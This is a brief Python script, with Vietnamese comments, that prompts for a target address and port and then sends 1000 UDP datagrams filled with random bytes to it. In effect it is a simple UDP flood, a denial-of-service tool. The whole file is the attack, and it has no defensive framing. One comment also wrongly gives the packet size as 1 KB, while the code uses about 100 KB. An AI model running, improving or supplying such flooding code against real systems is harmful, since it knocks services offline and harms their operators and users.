import socket
import random
import time

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

url = input("Enter Target URL: ")
port = int(input("Enter Target Port: "))

# Địa chỉ và cổng đích
target_address = (url, port)

# Số lượng vòng lặp thực tế hơn
num_messages = 1000
chunk_size = 1024 * 100  # Kích thước của mỗi gói tin (1 KB)

for i in range(num_messages):
    data = random._urandom(chunk_size)
    s.sendto(data, target_address)
    print(f"Sent: {i}")

s.close()